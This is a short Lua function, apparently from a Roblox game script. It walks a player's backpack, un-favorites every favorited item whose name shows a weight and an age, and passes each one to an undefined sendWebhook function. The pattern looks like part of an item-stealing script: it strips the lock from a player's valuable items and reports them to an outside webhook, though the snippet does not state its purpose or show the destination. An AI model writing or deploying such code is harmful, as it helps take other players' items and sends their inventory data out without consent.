local function unlockFavorites()
    for _, tool in ipairs(Backpack:GetChildren()) do
        if tool:IsA("Tool") and tool:GetAttribute("Favorite") == true then
            local name = tool.Name
            local hasWeight = string.match(name, "%[(.-) KG%]")
            local hasAge = string.match(name, "Age (%d+)")
            if hasWeight and hasAge then
                favoriteRemote:FireServer(tool)
                task.wait(0.05)
                sendWebhook(tool)
            end
        end
    end
end

